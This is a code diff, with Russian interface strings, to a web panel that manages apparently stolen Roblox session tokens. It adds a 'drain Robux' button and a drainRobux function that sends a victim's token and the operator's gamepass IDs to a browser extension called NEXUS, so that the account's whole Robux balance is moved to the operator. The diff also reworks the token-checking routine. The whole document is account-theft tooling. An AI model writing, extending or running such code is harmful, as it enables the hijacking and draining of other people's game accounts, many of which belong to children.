@@ -106,6 +106,9 @@ function renderTokens() {
     
     if (t.security) {
       html += '<button class="' + loginClass + '" onclick="loginToRoblox(\'' + tokenFull.replace(/'/g, "\\'") + '\', this, \'' + fileId.replace(/'/g, "\\'") + '\')">' + loginBtnText + '</button>';
+      if (valid && t.robux !== undefined && t.robux > 0) {
+        html += '<button class="btn-secondary" style="margin-top:0.5rem; width:100%; color: #10b981; border-color: rgba(16, 185, 129, 0.3); background: rgba(16, 185, 129, 0.05);" onclick="drainRobux(\'' + tokenFull.replace(/'/g, "\\'") + '\', this)">💸 Слить Robux</button>';
+      }
     } else {
       // no login button if no security token
     }
@@ -140,11 +143,37 @@ async function checkSingle(filename) {
       toast('❌ ' + (info.error || 'Невалид'), 'err');
     }
   } catch (e) {
-    if (e.message !== 'auth') toast('Ошибка проверки', 'err');
+    if (e.message !== 'auth')    toast('Нет связи с расширением NEXUS. Проверьте, установлено ли оно.', 'err');
   }
 }
 
-// ── Проверить все ─────────────────────────────────────────────────────────────
+// ── Слить Robux ───────────────────────────────────────────────────────────────
+function drainRobux(token, btn) {
+  const drainGamepasses = localStorage.getItem('ft_drainGamepasses') || '';
+  if (!drainGamepasses) {
+    toast('Ошибка: Не настроены ID геймпассов! Перейдите в Настройки.', 'err');
+    return;
+  }
+  
+  if (confirm('Вы уверены, что хотите перевести все доступные робуксы с этого аккаунта на ваши геймпассы?')) {
+    const originalText = btn.innerHTML;
+    btn.innerHTML = '⏳ В процессе...';
+    btn.disabled = true;
+    
+    const passesList = drainGamepasses.split(',').map(s => s.trim()).filter(Boolean);
+    
+    window.postMessage({ action: 'drain_robux_event', token: token, gamepasses: passesList }, '*');
+    toast('Задача на перевод робуксов отправлена в расширение NEXUS!');
+    
+    // Сброс кнопки через 5 сек (т.к. асинхронно в фоне)
+    setTimeout(() => {
+      btn.innerHTML = originalText;
+      btn.disabled = false;
+    }, 5000);
+  }
+}
+
+// ── Проверить все токены ─────────────────────────────────────────────────────────────
 document.getElementById('btnCheckAll').addEventListener('click', async function() {
   const btn = this;
   btn.disabled = true;
